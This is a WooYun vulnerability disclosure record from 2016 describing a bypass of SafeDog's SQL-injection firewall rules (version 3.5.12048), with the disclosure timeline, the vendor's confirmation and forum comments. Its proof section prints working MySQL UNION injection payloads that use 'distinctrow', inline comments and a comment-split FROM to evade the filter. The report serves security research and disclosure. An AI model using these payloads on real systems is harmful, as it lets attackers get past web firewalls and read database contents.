{"id": 86838, "wybug_id": "wooyun-2016-0174972", "wybug_title": "完美Bypass安全狗最新版(V3.5.12048)SQL注入防护规则(可UNION)", "wybug_corp": "安全狗", "wybug_author": "从容", "wybug_date": "2016-02-16 15:04", "wybug_open_date": "2016-05-18 16:30", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-21：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向公众公开  简要描述： 完美Bypass安全狗最新版(V3.5.12048)SQL注入防护规则(可UNION) 详细说明：  之前的Bypass安全狗是通过更新网马库的方式更新规则的\n\nMysql UNION语法\nhttp://**.**.**.**/doc/refman/5.5/en/union.htmlSELECT ...UNION [ALL | DISTINCT] SELECT ...[UNION [ALL | DISTINCT] SELECT ...]\n上回提到了这个union all\nhttp://**.**.**.**/bugs/wooyun-2016-0170433\n安全狗在过滤危险请求的时候两个敏感字段相邻就会被干掉，但是两个敏感字段中间\"插入\"点什么的话就不会被匹配到。distinct虽然没提到distinctrow但是也可以。   漏洞证明：  \nWindows Server2008 + php + Apache + mysql\n开启主动防御：\n\n之前的过滤了\n\n\n1' union distinctrow select/*!USER*/(),/*!DATABASE*/()#\n\n\n\n' union distinctrow select unhex('352E352E34322D6C6F67'),unhex('726F6F74406C6F63616C686F7374')#\n\n\n\nFROM1' union distinctrow select/*!USER*/(),/*!DATABASE*/()/*f*//*r*//*o*//*m*/users#\n\n\n   修复方案：  过滤吧~新年快乐。   版权声明：转载请注明来源 从容@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-02-18 16:29 厂商回复： 感谢提交，新年快乐~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-16 15:25 |    \t\t奶嘴 \t\t\t( 普通白帽子  |\t\t\t        Rank:383 漏洞数:95        | 16岁的毛孩有些厂商故意加你好友，和你聊...)\t\t \n  来了    \n     2016-02-16 15:31 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:44        | 要想Rank给高，标题一定得屌)\t\t \n  怒戳楼上16岁菊花    \n     2016-02-16 15:34 |    \t\t奶嘴 \t\t\t( 普通白帽子  |\t\t\t        Rank:383 漏洞数:95        | 16岁的毛孩有些厂商故意加你好友，和你聊...)\t\t \n  @路人毛 17了我    \n     2016-02-16 15:44 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  ...    \n     2016-02-16 16:07 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  给师傅跪了    \n     2016-02-16 16:32 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  666    \n     2016-02-16 17:25 |    \t\tAnkey. \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:20        | 小甜甜)\t\t \n  从容老表  长枪依在 菊花拿来    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}